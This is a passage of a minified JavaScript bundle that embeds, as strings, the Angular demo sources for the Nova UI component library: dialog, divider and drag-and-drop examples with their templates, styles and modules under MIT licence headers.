"./dialog-custom-class/dialog-custom-class.example.component";\nexport * from "./confirmation-dialog/confirmation-dialog.example.component";\nexport * from "./dialog-visual-test/dialog-visual-test.component";\nexport * from "./dialog-keyboard/dialog-with-keyboard.example.component";\nexport * from "./dialog-static-backdrop/dialog-with-static-backdrop.example.component";\nexport * from "./dialog-inside-overlay/dialog-inside-overlay.example.component";\nexport * from "./dialog-actions-before-closure/dialog-actions-before-closure.example.component";\nexport * from "./dialog-zindex-test/dialog-zindex-test.component";\nexport * from "./dialog-after-opened/dialog-after-opened.example.component";\nexport * from "./dialog-actions-before-closure/dialog-actions-before-closure.example.component";\nexport * from "./dialog-test/dialog-test.example.component";\nexport * from "./dialog-inside-overlay-with-date-time-picker/dialog-inside-overlay-with-date-time-picker.example.component";\n'},98405:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button\n            nui-button\n            type="button"\n            (click)="actionCanceled(); close()"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="actionDone(); close()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-default-dialog-btn"\n    nui-button\n    type="button"\n    (click)="open(content)"\n    i18n\n>\n    Click me!\n</button>\n'},51073:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-simple-dialog-example",\n    templateUrl: "./simple-dialog.example.component.html",\n})\nexport class SimpleDialogExampleComponent {\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        private dialogService: DialogService,\n        private toastService: ToastService\n    ) {}\n\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, { size: "sm" });\n    }\n\n    public actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n\n    public actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n}\n'},21886:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Basics</h2>\n\n<p>\n    Nui-divider can be used as a horizontal or vertical line divider with\n    customizable margins.\n</p>\n\n<h2>Horizontal Dividers</h2>\n\n<p>\n    <code>size</code> binding corresponds to divider\'s margins. There are 4\n    sizes for divider:\n</p>\n<ul>\n    <li><code>no-margin</code> - margin-top and margin-bottom equals 0</li>\n    <li><code>extra-small</code> - margin-top and margin-bottom equals 5px</li>\n    <li><code>small</code> - margin-top and margin-bottom equals 10px</li>\n    <li>\n        <code>medium</code> - margin-top and margin-bottom equals 15px. This is\n        the default.\n    </li>\n</ul>\n<p>Default margin for horizontal divider is <code>medium</code>.</p>\n\n<nui-example-wrapper\n    filenamePrefix="horizontal-dividers"\n    exampleTitle="Horizontal Divider sizes"\n>\n    <nui-horizontal-dividers-example></nui-horizontal-dividers-example>\n</nui-example-wrapper>\n\n<h2>Vertical Dividers</h2>\n\n<p>\n    Vertical divider could be added by using\n    <code>[isVertical]="true"</code> binding on divider.\n</p>\n<p>\n    As well as horizontal dividers, vertical has the same sizes so it affects\n    left and right margins respectively.\n</p>\n<p>Default margin for vertical divider is <code>extra-small</code>.</p>\n\n<p>\n    <b>NOTE:</b> divider should be placed into flex container (only applies to\n    vertical dividers).\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="vertical-dividers"\n    exampleTitle="Vertical Divider sizes"\n>\n    <nui-vertical-dividers-example></nui-vertical-dividers-example>\n</nui-example-wrapper>\n'},36890:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-divider-docs-example",\n    templateUrl: "./divider-docs.example.component.html",\n})\nexport class DividerExampleComponent {}\n'},65419:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDividerModule,\n    NuiDocsModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    DividerExampleComponent,\n    HorizontalDividersExampleComponent,\n    VerticalDividersExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: DividerExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.alpha,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [NuiDividerModule, NuiDocsModule, RouterModule.forChild(routes)],\n    declarations: [\n        DividerExampleComponent,\n        HorizontalDividersExampleComponent,\n        VerticalDividersExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("divider"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class DividerModule {}\n'},54270:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div i18n>No margins</div>\n<nui-divider id="nui-demo-no-margin-horizontal" size="no-margin"></nui-divider>\n<div i18n>No margins</div>\n<br />\n<div i18n>Extra-small size</div>\n<nui-divider\n    id="nui-demo-extra-small-horizontal"\n    size="extra-small"\n></nui-divider>\n<div i18n>Extra-small size</div>\n<br />\n<div i18n>Small size</div>\n<nui-divider id="nui-demo-small-horizontal" size="small"></nui-divider>\n<div i18n>Small size</div>\n<br />\n<div i18n>Medium size</div>\n<nui-divider id="nui-demo-medium-horizontal" size="medium"></nui-divider>\n<div i18n>Medium size</div>\n'},81690:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-horizontal-dividers-example",\n    templateUrl: "./horizontal-dividers.example.component.html",\n})\nexport class HorizontalDividersExampleComponent {}\n'},28572:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./divider-docs/divider-docs.example.component";\nexport * from "./horizontal-dividers/horizontal-dividers.example.component";\nexport * from "./vertical-dividers/vertical-dividers.example.component";\n'},70830:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex" style="height: 50px">\n    <div class="align-self-center" i18n>No margins</div>\n    <nui-divider\n        id="nui-demo-no-margin-vertical"\n        [isVertical]="true"\n        size="no-margin"\n    ></nui-divider>\n    <div class="align-self-center" i18n>No margins</div>\n</div>\n<br />\n<div class="d-flex" style="height: 50px">\n    <div class="align-self-center" i18n>Extra small size</div>\n    <nui-divider\n        id="nui-demo-extra-small-vertical"\n        [isVertical]="true"\n        size="extra-small"\n    ></nui-divider>\n    <div class="align-self-center" i18n>Extra small size</div>\n</div>\n<br />\n<div class="d-flex" style="height: 50px">\n    <div class="align-self-center" i18n>Small size</div>\n    <nui-divider\n        id="nui-demo-small-vertical"\n        [isVertical]="true"\n        size="small"\n    ></nui-divider>\n    <div class="align-self-center" i18n>Small size</div>\n</div>\n<br />\n<div class="d-flex" style="height: 50px">\n    <div class="align-self-center" i18n>Medium size</div>\n    <nui-divider\n        id="nui-demo-medium-vertical"\n        [isVertical]="true"\n        size="medium"\n    ></nui-divider>\n    <div class="align-self-center" i18n>Medium size</div>\n</div>\n'},76266:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-vertical-dividers-example",\n    templateUrl: "./vertical-dividers.example.component.html",\n})\nexport class VerticalDividersExampleComponent {}\n'},13843:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<section class="drag-section">\n    <nui-draggable\n        [payload]="draggableObj"\n        [dropTarget]="droppable"\n        (dragStart)="onDragStart($event)"\n        (dragEnd)="onDragEnd($event)"\n        i18n\n    >\n        <div class="drag">drag me</div>\n    </nui-draggable>\n    <pre>{{ draggableObj | json }}</pre>\n\n    <nui-draggable\n        [payload]="draggableObjHandle"\n        [dropTarget]="droppable"\n        [dragHandle]="true"\n        (dragStart)="onDragStart($event)"\n        (dragEnd)="onDragEnd($event)"\n        i18n\n    >\n        <div class="drag">drag me (handle)</div>\n    </nui-draggable>\n    <pre>{{ draggableObjHandle | json }}</pre>\n\n    <nui-draggable\n        [payload]="draggableObjPreview"\n        [dragPreview]="dragPreview"\n        [dropTarget]="droppable"\n        (dragStart)="onDragStart($event)"\n        (dragEnd)="onDragEnd($event)"\n        i18n\n    >\n        <div class="drag drag-with-preview">drag me (preview)</div>\n    </nui-draggable>\n    <pre>{{ draggableObjPreview | json }}</pre>\n\n    <nui-draggable\n        *ngFor="let item of draggableList"\n        [payload]="item"\n        [dropTarget]="droppable"\n        (dragStart)="onDragStart($event)"\n        (dragEnd)="onDragEnd($event)"\n        i18n\n    >\n        <div class="drag">drag me ({{ item }})</div>\n    </nui-draggable>\n</section>\n\n<section class="drop-section">\n    <nui-droppable\n        #droppable\n        (dropSuccess)="onDrop($event)"\n        (dragOver)="onDragOver($event)"\n        (dragEnter)="onDragEnter($event)"\n        (dragLeave)="onDragLeave($event)"\n        i18n\n    >\n        <div class="drop">drop here</div>\n    </nui-droppable>\n    <pre>{{ destObject | json }}</pre>\n</section>\n\n<ng-template #dragPreview>\n    <pre>\n         _,(_)._\n    ___,(_______).\n  ,\'__.           \\    /\\_\n /,\' /             \\  /  /\n| | |              |,\'  /\n \\`.|                  /\n  `. :           :    /\n    `.            :.,\'\n      `-.________,-\'</pre\n    >\n</ng-template>\n'},94775:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="section {\n    display: inline-grid;\n    margin: 20px;\n}\n\n.drop-section {\n    position: fixed;\n}\n.drag {\n    border: 1px dotted black;\n    padding: 10px;\n}\n.drag-with-preview {\n    height: 200px;\n}\n.drop {\n    width: 300px;\n    height: 300px;\n    line-height: 300px;\n    text-align: center;\n}\n"},72747:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-dd-cdk-example",\n    templateUrl: "./dragdrop.example.component.html",\n    styleUrls: ["./dragdrop.example.component.less"],\n})\nexport class DragdropExampleComponent {\n    public draggableObj = {\n        imma: "little",\n        teapot: "short and stout",\n    };\n    public draggableObjHandle = {\n        "here is my handle": "here is my spout",\n    };\n    public draggableObjPreview = {\n        when: "I get all steamed up",\n        hear: "me shout",\n    };\n    public draggableList = ["item 1", "item2", "item3"];\n    public destObject: {};\n\n    public onDrop(payload: any): void {\n        this.destObject = payload;\n    }\n\n    public onDragStart(event: DragEvent): void {}\n\n    public onDragEnd(event: DragEvent): void {}\n\n    public onDragOver(event: DragEvent): void {}\n\n    public onDragEnter(event: DragEvent): void {}\n\n    public onDragLeave(event: DragEvent): void {}\n}\n'},51686:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiCommonModule,\n    NuiDndModule,\n    NuiDocsModule,\n    SrlcStage,\n    NuiDragDropModule,\n} from "@nova-ui/bits";\n\nimport { DragdropExampleComponent } from "./dragdrop.example.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: DragdropExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.preAlpha,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiDocsModule,\n        NuiCommonModule,\n        NuiDndModule,\n        RouterModule.forChild(routes),\n        NuiDragDropModule,\n    ],\n    declarations: [DragdropExampleComponent],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("dragdrop-cdk"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class DragDropCdkDemoModule {}\n'},76040:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="row">\n    <div class="col-6">\n        <div\n            class="drag-drop-item"\n            id="nui-demo-src-object"\n            nuiDraggable\n            [payload]="draggableObj"\n            adornerDragClass="demo-drag-class"\n            (dragStart)="onDragStart($event)"\n            (dragEnd)="onDragEnd($event)"\n            i18n\n        >\n            drag me (object)\n        </div>\n        <pre>{{ draggableObj | json }}</pre>\n    </div>\n    <div class="col-6">\n        <div\n            class="drag-drop-item"\n            id="nui-demo-dest-object"\n            nuiDroppable\n            dropIndicatorClass="demo-drop-indicator-class"\n            dragOverClass="demo-drag-over-class"\n            invalidDragOverClass="demo-invalid-drag-over-class"\n            [dropValidator]="isObjectValidator"\n            (dropSuccess)="onDropObject($event)"\n            (dragOver)="onDragOver($event)"\n            (dragEnter)="onDragEnter($event)"\n            (dragLeave)="onDragLeave($event)"\n            i18n\n        >\n            drop here - object\n        </div>\n        <pre>{{ destObject | json }}</pre>\n    </div>\n</div>\n<div class="row">\n    <div class="col-6">\n        <div\n            class="drag-drop-item"\n            nuiDraggable\n            [payload]="draggableString"\n            adornerDragClass="demo-drag-class"\n            (dragStart)="onDragStart($event)"\n            (dragEnd)="onDragEnd($event)"\n            i18n\n        >\n            drag me (string)\n        </div>\n        <pre>{{ draggableString }}</pre>\n    </div>\n\n    <div class="col-6">\n        <div\n            class="drag-drop-item"\n            nuiDroppable\n            [dropValidator]="isStringValidator"\n            dropIndicatorClass="demo-drop-indicator-class"\n            dragOverClass="demo-drag-over-class"\n            invalidDragOverClass="demo-invalid-drag-over-class"\n            (dropSuccess)="onDropString($event)"\n            (dragOver)="onDragOver($event)"\n            (dragEnter)="onDragEnter($event)"\n            (dragLeave)="onDragLeave($event)"\n            i18n\n        >\n            drop here - string\n        </div>\n        <pre>{{ destString }}</pre>\n    </div>\n</div>\n<div class="row">\n    <div class="col-12">\n        <div\n            class="drag-drop-item"\n            nuiDraggable\n            [payload]="draggableExcel"\n            (dragStart)="onDragStart($event)"\n            (dragEnd)="onDragEnd($event)"\n            i18n\n        >\n            drag me to Excel (htmlTable)\n        </div>\n        <pre>{{ draggableExcel }}</pre>\n    </div>\n</div>\n<div class="row">\n    <div class="col-12">\n        <div\n            class="drag-drop-item"\n            nuiDroppable\n            dropIndicatorClass="demo-drop-indicator-class"\n            dragOverClass="demo-drag-over-class"\n            invalidDragOverClass="demo-invalid-drag-over-class"\n            (dragOver)="onDragOver($event)"\n            (dragEnter)="onDragEnter($event)"\n            (dragLeave)="onDragLeave($event)"\n            (dropSuccess)="onDropAnything($event)"\n            i18n\n        >\n            drop anything\n        </div>\n        <pre>{{ destAnything | json }}</pre>\n    </div>\n</div>\n'},80928:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".drag-drop-item {\n    border: 1px solid grey;\n    text-align: center;\n}\n.demo-drag-over-class {\n    border-color: #30b230;\n    background-color: #e7f4df;\n}\n.demo-invalid-drag-over-class {\n    border-color: #d50000;\n    background-color: #ffe4e0;\n}\n.demo-drop-indicator-class {\n    border-color: #3caadd;\n    background-color: #a0cede;\n}\n"},68600:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport {\n    IDropEvent,\n    IDropValidator,\n    IToastService,\n    ToastService,\n} from "@nova-ui/bits";\n\nclass IsStringValidator implements IDropValidator {\n    isValidDropTarget(payload: any, isExternal: boolean): boolean {\n        if (isExternal) {\n            return false;\n        }\n        return typeof payload === "string";\n    }\n}\n\nclass IsObjectValidator implements IDropValidator {\n    isValidDropTarget(payload: any): boolean {\n        return typeof payload === "object";\n    }\n}\n\n@Component({\n    selector: "nui-dragdrop-validator-example",\n    templateUrl: "./dragdrop-basic.example.component.html",\n})\nexport class DragdropBasicExampleComponent {\n    public draggableString = "this is a string";\n    public draggableObj = {\n        imma: "little",\n        teapot: "short and stout",\n    };\n    public destObject: {};\n    public destString: string;\n    public destAnything: any;\n    public draggableExcel =\n        "<table>" +\n        "<tr>" +\n        "<th>thing1</th>" +\n        "<th>thing2</th>" +\n        "</tr>" +\n        "<tr>" +\n        "<td>jeff</td>" +\n        "<td>4</td>" +\n        "</tr>" +\n        "<tr>" +\n        "<td>john</td>" +\n        "<td>8</td>" +\n        "</tr>" +\n        "</table>";\n    public isStringValidator = new IsStringValidator();\n    public isObjectValidator = new IsObjectValidator();\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public onDropObject(dropEvent: IDropEvent): void {\n        this.toastService.info({ message: $localize`Drop object!` });\n        this.destObject = dropEvent.payload;\n    }\n\n    public onDropString(dropEvent: IDropEvent): void {\n        this.toastService.info({ message: $localize`Drop string!` });\n        this.destString = JSON.stringify(dropEvent.payload);\n    }\n\n    public onDropAnything(dropEvent: IDropEvent): void {\n        this.toastService.info({ message: $localize`Drop anything!` });\n        this.destAnything = dropEvent.payload;\n    }\n\n    public onDragStart(event: DragEvent): void {\n        this.toastService.info({ message: $localize`Drag start` });\n    }\n\n    public onDragEnd(event: DragEvent): void {\n        this.toastService.info({ message: $localize`Drag end` });\n    }\n\n    public onDragOver(event: DragEvent): void {\n        this.toastService.info({\n            message: $localize`Drag over`,\n            options: { preventDuplicates: true },\n        });\n    }\n\n    public onDragEnter(event: DragEvent): void {\n        this.toastService.info({ message: $localize`Drag enter` });\n    }\n\n    public onDragLeave(event: DragEvent): void {\n        this.toastService.info({ message: $localize`Drag leave` });\n    }\n}\n'},55412:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-demo-draggable" cdkDrag>Drag me around</div>\n'},47764:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// This can be moved to bits!\n@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n'},81012:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  